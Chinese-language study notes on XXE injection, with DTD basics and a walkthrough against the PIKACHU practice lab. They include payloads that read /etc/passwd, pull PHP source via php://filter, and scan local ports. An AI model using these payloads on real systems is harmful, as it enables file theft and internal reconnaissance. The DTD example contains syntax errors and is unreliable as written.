## XXE 

XXE (xml external entity injection) xml外部实体注入漏洞
攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致存在注入点

**文档类型定义（DTD）**
文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。
DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
**内部的 DOCTYPE 声明：**
`<!DOCTYPE 根元素 [元素声明]>`

```xml
//简单的内部DTD声明
<!--XML 声明-->
<?xml version="1.0"?>
<!--文档类型定义-->
<!DOCTYPE note [ <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)> <!--定义 note 元素有四个元素-->
<!ELEMENT to (#PCDATA)> <!--定义 to 元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)> <!--定义 from 元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)> <!--定义 head 元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)> <!--定义 body 元素为”#PCDATA”类型-->
]]]>
<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

**外部引用：**
`<!DOCTYPE 根元素 SYSTEM ” 文件名 ”> `

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note> 
```

```dtd
//note.dtd：	
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>	
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

### 什么是DTD 实体？

实体是用于定义引用普通文本或特殊字符的快捷方式的变量。

### 什么是XXE漏洞？

XXE（XML External Entity Injection），即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时， 没有禁止外部实体的加载 ，导致可加载恶意外部文件，造成文件读取、命令执行、攻击内网网站等危害。


------

这里用PIKACHU靶场做演示:

![image-20231027120226799](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027120226799.png)

先尝试输入一段:

```xml
<?xml version="1.0"?> 
<!DOCTYPE foo [    
<!ENTITY xxe "傻逼" > ]> 
<foo>&xxe;</foo>
```

```xml
<?xml version="1.0"?> 
<!DOCTYPE foo [    
<!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> 
<foo>&xxe;</foo>
就可以查看敏感目录文件
```

------

php伪协议

```xml
<?xml version="1.0"?> 
<!DOCTYPE foo [    
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=../../phpinfo.php" > ]> 
<foo>&xxe;</foo>
```


![image-20231027122728471](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027122728471.png)

![image-20231027122754173](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027122754173.png)

------

端口开放情况

```xml
<?xml version="1.0"?> 
<!DOCTYPE foo [    
<!ENTITY xxe SYSTEM "http://127.0.0.1:80" > ]> 
<foo>&xxe;</foo>
```

```xml
<?xml version="1.0"?> 
<!DOCTYPE foo [    
<!ENTITY xxe SYSTEM "http://127.0.0.1:81" > ]> 
<foo>&xxe;</foo>
```

可以根据站点响应的时间来判断端口是否开放 第一个80端口开放 所以响应时间很短 第二个则很长 那就是没开放

**利用bp爆破模块**
![image-20231027123200638](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027123200638.png)

![image-20231027123207273](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027123207273.png)

![image-20231027123250136](C:\Users\13461\AppData\Roaming\Typora\typora-user-images\image-20231027123250136.png)

可以看到80端口响应时间最短 是开放的

------

